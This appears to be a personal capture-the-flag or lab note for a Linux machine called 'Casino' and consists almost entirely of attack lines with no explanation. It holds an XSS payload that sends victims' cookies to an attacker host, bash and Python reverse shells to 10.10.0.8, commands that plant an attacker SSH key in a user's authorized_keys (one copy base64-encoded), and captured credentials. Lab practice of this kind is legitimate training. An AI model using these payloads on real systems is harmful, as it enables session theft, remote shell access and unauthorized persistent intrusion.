---
tags: [Challenge, Linux, Video]
title: Casino
created: '2020-07-16T16:47:02.375Z'
modified: '2020-10-02T17:43:09.855Z'
---

# Casino
# Template
- IP: `172.31.3.7`
- OS: `Linux`
## Enumeration
### Writeup
`<script>document.location='http://10.10.0.8/XSS/grabber.php?c='+document.cookie</script>`
`erlich:i_L0v3$$$`

`bash -i >& /dev/tcp/10.10.0.8/1234 0>&1`

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCijA+ED77tQVamLDHkpL68Wp2T3ZDkhhS9FB8Zp93MjP9jjyowFR7fs7XkC9xSHeIpz2oKcoLtq4o2d2wpSOl/4uykIfATzRep2+xP/qRK4uP9Y+HK2eD0CdtPWvgzyAArRk/ZmSHuG7r4hVt8gGQSn7ovL6CmeCIa75WuGLFeBadnbDSoEeXk4l0bxoMh/RK+FTnhLnq+MSLfWBsb2Spf9F5lpfdlJpUUDRfkwnxzvNDeK1EaCCfIvEBeOzU7+N8Qgxse686pDu5wBFalyDMbCdb3pHohEec6cG9bmnGhpjHQQpmlHrbNEGSF2+xA6o+hQDkKyYuE4pTECULnk82PWFK+8033XiaJ/0nGyv7zmZDpEIcCriO/mRpH3WMeAvqbx9xmjz/WE3ZBUdeX1w9cwnSMcmWA/bGG7F52EIei6Nox2JeN0hHOnAkm9OMvmxAOL2mRgjxA+Lv7BodDgss16jpE7TYpfrnGviVAT8omBz2M+hEL5P9QF3/eAZF+c1k= root@kali" >> /home/grey/.ssh/authorized_keys`

`echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDaWpBK0VENzd0UVZhbUxESGtwTDY4V3AyVDNaRGtoaFM5RkI4WnA5M01qUDlqanlvd0ZSN2ZzN1hrQzl4U0hlSXB6Mm9LY29MdHE0bzJkMndwU09sLzR1eWtJZkFUelJlcDIreFAvcVJLNHVQOVkrSEsyZUQwQ2R0UFd2Z3p5QUFyUmsvWm1TSHVHN3I0aFZ0OGdHUVNuN292TDZDbWVDSWE3NVd1R0xGZUJhZG5iRFNvRWVYazRsMGJ4b01oL1JLK0ZUbmhMbnErTVNMZldCc2IyU3BmOUY1bHBmZGxKcFVVRFJma3dueHp2TkRlSzFFYUNDZkl2RUJlT3pVNytOOFFneHNlNjg2cER1NXdCRmFseURNYkNkYjNwSG9oRWVjNmNHOWJtbkdocGpIUVFwbWxIcmJORUdTRjIreEE2bytoUURrS3lZdUU0cFRFQ1VMbms4MlBXRksrODAzM1hpYUovMG5HeXY3em1aRHBFSWNDcmlPL21ScEgzV01lQXZxYng5eG1qei9XRTNaQlVkZVgxdzljd25TTWNtV0EvYkdHN0Y1MkVJZWk2Tm94MkplTjBoSE9uQWttOU9Ndm14QU9MMm1SZ2p4QStMdjdCb2REZ3NzMTZqcEU3VFlwZnJuR3ZpVkFUOG9tQnoyTStoRUw1UDlRRjMvZUFaRitjMWs9IHJvb3RAa2FsaQo= | base64 -d > /home/grey/.ssh/authorized_keys`

`>F73SzS36>V$tJmc`
### Commands
<details>
<summary></summary>

- ``
```

```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
